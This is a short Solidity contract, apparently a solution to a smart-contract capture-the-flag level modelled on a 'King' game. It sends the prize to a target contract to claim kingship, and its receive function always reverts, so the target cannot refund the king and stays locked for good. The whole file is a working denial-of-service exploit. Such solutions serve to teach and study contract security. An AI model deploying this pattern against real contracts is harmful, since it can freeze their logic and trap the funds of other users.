// SPDX-License-Identifier: NOLICENCE
pragma solidity ^0.8.0;

contract KingAttacker {
    uint256 public prize = 0.001 ether; // initial prize is 0.001 ether

    constructor() payable {
        require(msg.value >= prize, "Need initial funds.");
    }

    receive() external payable {
        revert("Long live the king!");
    }

    function attack(address payable _target) public {
        (bool success, ) = _target.call{value: prize}("");
        require(success, "Claim failed.");
    }
}
